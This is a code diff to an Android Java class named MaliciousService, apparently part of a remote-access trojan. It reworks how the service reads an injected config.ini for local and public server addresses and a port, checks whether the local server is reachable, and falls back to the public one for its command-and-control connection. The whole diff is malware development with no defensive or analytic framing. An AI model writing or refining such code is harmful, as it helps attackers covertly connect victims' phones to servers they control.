@@ -267,34 +267,37 @@ public class MaliciousService extends Service {
             Properties props = new Properties();
             props.load(is);
             is.close();
+            
+            // Get properties from the [SERVER] section
             String localIp = props.getProperty("LOCAL_IP");
             String publicIp = props.getProperty("PUBLIC_IP");
-            String injectedFlaskPort = props.getProperty("FLASK_PORT");
-            String injectedRatPort = props.getProperty("RAT_PORT");
+            String port = props.getProperty("PORT");
+            
+            Log.d(TAG, "Read from config.ini: LOCAL_IP=" + localIp + ", PUBLIC_IP=" + publicIp + ", PORT=" + port);
             
             // First try to use local IP (same WiFi)
-            if (localIp != null && !localIp.isEmpty() && injectedFlaskPort != null && !injectedFlaskPort.isEmpty()) {
-                Log.d(TAG, "Trying local IP first: " + localIp + ":" + injectedFlaskPort);
-                saveServerConfigToPreferences(localIp, injectedFlaskPort, injectedRatPort);
+            if (localIp != null && !localIp.isEmpty() && port != null && !port.isEmpty()) {
+                Log.d(TAG, "Trying local IP first: " + localIp + ":" + port);
+                saveServerConfigToPreferences(localIp, port, port);
                 
                 // Schedule a check to try public IP if local fails
                 Handler handler = new Handler();
                 handler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
-                        if (!isServerReachable(localIp, injectedFlaskPort) && publicIp != null && !publicIp.isEmpty()) {
+                        if (!isServerReachable(localIp, port) && publicIp != null && !publicIp.isEmpty()) {
                             Log.d(TAG, "Local IP unreachable, switching to public IP: " + publicIp);
-                            saveServerConfigToPreferences(publicIp, injectedFlaskPort, injectedRatPort);
+                            saveServerConfigToPreferences(publicIp, port, port);
                         }
                     }
                 }, 5000); // Wait 5 seconds before checking
             } 
             // If no local IP or it's empty, try public IP directly
-            else if (publicIp != null && !publicIp.isEmpty() && injectedFlaskPort != null && !injectedFlaskPort.isEmpty()) {
-                Log.d(TAG, "Using public IP: " + publicIp + ":" + injectedFlaskPort);
-                saveServerConfigToPreferences(publicIp, injectedFlaskPort, injectedRatPort);
+            else if (publicIp != null && !publicIp.isEmpty() && port != null && !port.isEmpty()) {
+                Log.d(TAG, "Using public IP: " + publicIp + ":" + port);
+                saveServerConfigToPreferences(publicIp, port, port);
             } else {
-                Log.w(TAG, "Injected config.ini found but IP/Flask Port are missing or empty.");
+                Log.w(TAG, "Injected config.ini found but IP/Port are missing or empty.");
             }
         } catch (IOException e) {
             Log.w(TAG, "config.ini not found in assets, or error reading it: " + e.getMessage());
